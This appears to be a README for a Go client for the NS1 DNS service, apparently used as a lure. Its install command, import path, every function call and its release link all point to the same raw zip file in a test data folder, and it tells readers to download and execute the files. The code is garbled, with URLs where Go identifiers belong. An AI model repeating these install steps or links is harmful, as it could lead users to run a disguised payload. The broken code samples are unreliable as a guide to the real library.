# ns1-go 🌐

![GitHub release](https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip)

Welcome to the **ns1-go** repository! This project provides a Golang API client for NS1, a leading DNS and traffic management service. With this client, you can easily interact with the NS1 API, enabling you to manage your DNS records and traffic flows programmatically.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [API Reference](#api-reference)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Features

- **Simple API Access**: Interact with NS1's powerful API using straightforward Golang functions.
- **DNS Record Management**: Create, read, update, and delete DNS records easily.
- **Traffic Management**: Manage traffic flows and routing policies effectively.
- **Error Handling**: Built-in error handling to ensure smooth operations.
- **Comprehensive Documentation**: Detailed documentation to help you get started quickly.

## Installation

To install the **ns1-go** client, use the following command:

```bash
go get https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip
```

This command will download the package and its dependencies.

## Usage

After installation, you can start using the client. Here’s a basic example to get you started:

```go
package main

import (
    "fmt"
    "https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip"
)

func main() {
    client := https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip("YOUR_API_KEY")

    // Example: Fetch zones
    zones, err := https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip()
    if err != nil {
        https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip("Error fetching zones:", err)
        return
    }

    for _, zone := range zones {
        https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip("Zone:", zone)
    }
}
```

Replace `YOUR_API_KEY` with your actual NS1 API key.

## API Reference

The API reference documentation is available in the `docs` folder. This includes detailed descriptions of all available methods and their parameters.

## Examples

You can find more examples in the `examples` directory. Here are a few key examples:

1. **Listing DNS Zones**: This example shows how to list all DNS zones in your NS1 account.
2. **Creating a DNS Record**: This example demonstrates how to create a new DNS record.
3. **Updating a DNS Record**: Learn how to update existing DNS records.

## Contributing

We welcome contributions! If you want to contribute to the **ns1-go** project, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your fork.
5. Create a pull request.

Please ensure that your code adheres to the existing style and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

For the latest releases, please visit [this link](https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip). You can download the necessary files and execute them as needed.

Additionally, you can always check the "Releases" section in this repository for updates.

## Conclusion

Thank you for checking out **ns1-go**! We hope this client makes your interaction with the NS1 API easier and more efficient. If you have any questions or feedback, feel free to open an issue in this repository. Happy coding!